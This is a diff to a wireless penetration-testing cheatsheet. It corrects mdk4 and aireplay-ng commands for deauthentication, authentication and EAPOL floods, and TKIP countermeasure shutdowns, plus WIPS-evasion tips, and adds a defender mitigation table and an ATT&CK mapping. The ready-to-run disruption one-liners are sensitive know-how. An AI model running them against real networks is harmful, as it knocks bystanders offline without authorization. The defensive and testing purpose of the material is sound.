@@ -37,8 +37,10 @@ sudo aireplay-ng --deauth 5 \
 sudo aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF wlan0mon
 # --deauth 0 = continuous
 
-# Multiple APs from a list
-sudo mdk4 wlan0mon d -B target_bssids.txt -c 1,6,11
+# Multiple APs across channels (mode d = deauth/disassoc amok).
+# Flag for a MAC filter file is version-dependent: -w (whitelist) / -b (blacklist).
+# Confirm with `mdk4 --help d` before use; -c takes the channel hop list.
+sudo mdk4 wlan0mon d -b target_macs.txt -c 1,6,11
 ```
 
 Only with explicit authorization. Continuous broadcast deauth is a clear DoS signal and trips most WIPS within seconds.
@@ -62,14 +64,24 @@ sudo airodump-ng wlan0mon -c <ch> --bssid <BSSID>
 
 PMF protects deauth/disassoc but doesn't always protect all action frames. Specific action types remain exploitable:
 
+PMF protects deauth/disassoc, but other mdk4 modes still cause disconnects without spoofing a protected management frame. Verify mode letters against `mdk4 --help <mode>` on your installed version — they have been mislabeled in many copied cheatsheets.
+
 ```bash
-# mdk4 multi-tool attacks
-sudo mdk4 wlan0mon a -a <BSSID>     # auth attack: floods auth frames, AP eventually disconnects clients
-sudo mdk4 wlan0mon m -t <BSSID>     # CTS frame attack — abuse virtual carrier sense
-sudo mdk4 wlan0mon w -t <BSSID>     # WPA-Enterprise: SAE auth flood
+# mode a — authentication DoS: floods the AP with auth frames, exhausting its
+# client/association table so legitimate clients can't connect. Works regardless of PMF.
+sudo mdk4 wlan0mon a -a <BSSID>
+
+# mode e — EAPOL start/logoff flood: can kick clients off; not a spoofed deauth frame.
+sudo mdk4 wlan0mon e -t <BSSID>
+
+# mode m — Michael (TKIP) countermeasures: forces a ~60s AP shutdown.
+# ONLY applies to legacy TKIP networks, not CCMP/WPA2-AES or WPA3.
+sudo mdk4 wlan0mon m -t <BSSID>
 ```
 
-Action frames the IEEE 802.11 spec marks as "may be unprotected" include some block-ack and channel-switch announcements — implementation-specific exploitation paths exist but require chipset-specific testing.
+> Correction vs. common cheatsheets: mdk4 mode `m` is **Michael/TKIP countermeasures**, not a "CTS/virtual-carrier" attack, and mode `w` is **WIDS confusion**, not an "SAE/WPA-Enterprise flood" (SAE is WPA3). Don't rely on those mislabeled one-liners.
+
+Separately, the IEEE 802.11 spec marks some action frames (certain block-ack and channel-switch announcements) as "may be unprotected" — implementation-specific paths exist but require chipset-specific testing.
 
 ## Beacon Flooding
 
@@ -95,6 +107,23 @@ Use cases:
 | Beacon flood >50/sec | Saturates WIPS dashboards |
 
 Randomize source MAC across burst-and-pause cycles to spread the signal.
+
+## Mitigations / Defender Hardening
+
+This is the counter. Deauth/disassoc abuse is a *solved* problem at the protocol level — the gap is deployment, not defense:
+
+| Technique | Mitigation |
+|---|---|
+| Classic deauth/disassoc spoofing | **Set PMF (802.11w) to Required**, not just Capable. Required cryptographically authenticates management frames and makes classic deauth inert |
+| PMF left Capable/optional | Audit every SSID; Capable still lets non-PMF clients be deauthed. Move to Required once the client fleet supports it |
+| Legacy clients blocking PMF-Required | Segment legacy devices onto a separate SSID/VLAN so the main network can enforce Required |
+| Protocol gap entirely | **Deploy WPA3** — PMF is mandatory in WPA3, closing the deauth vector by default |
+| Action-frame / auth-flood attacks | Enable WIPS containment + rate-limit auth/assoc; patch AP firmware for known management-frame floods |
+| Beacon flood hiding an evil twin | WIPS rogue-AP detection tuned to alert (not just dashboard); 802.11r/k/v for sane roaming so a rogue SSID is less attractive |
+
+Defender one-liner: **PMF-Required (or WPA3) + a tuned WIPS** removes the classic deauth vector outright and turns the remaining action-frame paths into loud, chipset-specific noise.
+
+Verification step a blue team can run: confirm the RSN capabilities bit advertises **MFPR (Management Frame Protection Required)**, not just MFPC (Capable), in the beacon of every production SSID.
 
 ## Engagement Cheatsheet
 
@@ -123,10 +152,20 @@ Document for each test:
 
 ---
 
+## MITRE ATT&CK Mapping
+
+| Technique | ID | Where it appears here |
+|---|---|---|
+| Network Denial of Service | T1498 | Broadcast / continuous deauth; auth and beacon floods |
+| Adversary-in-the-Middle | T1557 | Deauth to drive clients onto an evil twin |
+| Network Sniffing | T1040 | Forcing reconnection to capture the WPA handshake |
+
 ## Key References
 
-- aireplay-ng documentation
-- mdk4: github.com/aircrack-ng/mdk4
-- IEEE 802.11w-2009 (PMF spec, now folded into 802.11-2020)
-- "Why MAC Address Randomization Doesn't Work" — research on action-frame leakage
+- aireplay-ng documentation: https://www.aircrack-ng.org/doku.php?id=aireplay-ng
+- mdk4: https://github.com/aircrack-ng/mdk4
+- IEEE 802.11w-2009 — Protected Management Frames (now folded into IEEE 802.11-2020)
+- Wi-Fi Alliance — WPA3 specification (PMF mandatory): https://www.wi-fi.org/discover-wi-fi/security
+- "Why MAC Address Randomization Doesn't Work" — research on action-frame / probe leakage
+- MITRE ATT&CK: https://attack.mitre.org/techniques/T1498/
 - Source: https://github.com/SnailSploit/offensive-checklist/blob/main/wireless.md
